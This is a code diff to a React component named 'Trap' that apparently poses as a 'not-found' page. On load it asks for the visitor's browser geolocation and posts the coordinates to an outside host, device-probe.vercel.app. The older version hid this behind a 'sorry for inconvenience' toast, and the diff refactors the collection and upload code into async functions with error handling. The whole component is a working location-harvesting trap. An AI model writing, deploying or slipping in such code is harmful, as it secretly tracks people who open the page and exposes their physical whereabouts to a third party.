@@ -2,40 +2,54 @@
 import React from "react";
 import axios from "axios";
 import { useEffect } from "react";
-import { ToastContainer, toast } from 'react-toastify';
-import 'react-toastify/dist/ReactToastify.css';
+import { ToastContainer, toast } from "react-toastify";
+import "react-toastify/dist/ReactToastify.css";
 
 const Trap = () => {
   useEffect(() => {
     getLocation();
   }, []);
 
-  function getLocation() {
-    navigator.geolocation.getCurrentPosition(async (position) => {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-
+  async function getLocation() {
+    try {
+      const position = await getCurrentPosition();
+      const { latitude, longitude } = position.coords;
       const body = {
         deviceLatitude: latitude,
         deviceLongitude: longitude,
       };
-      main(body);
+      await main(body);
+    } catch (error) {
+      console.error("Error getting location:", error);
+      toast.error("Failed to retrieve location");
+    }
+  }
+
+  async function getCurrentPosition() {
+    return new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(
+        (position) => resolve(position),
+        (error) => reject(error)
+      );
     });
   }
 
   async function main(body) {
-    const query = await axios.post(`https://device-probe.vercel.app/`, {
-      deviceLatitude: body.deviceLatitude,
-      deviceLongitude: body.deviceLongitude,
-    });
-
-    console.log(query.data);
-    query.data !== undefined
-      ? toast.success("sorry for inconvenience")
-      : toast.warn("sorry for inconvenience");
-    return query.data;
-
+    try {
+      const response = await axios.post(
+        "https://device-probe.vercel.app/",
+        body
+      );
+      console.log(response.data);
+      toast.success("Location sent successfully");
+      return response.data;
+    } catch (error) {
+      console.error("Error sending location:", error);
+      toast.error("Failed to send location");
+      throw error; 
+    }
   }
+
   return (
     <>
       <div className="not-found">
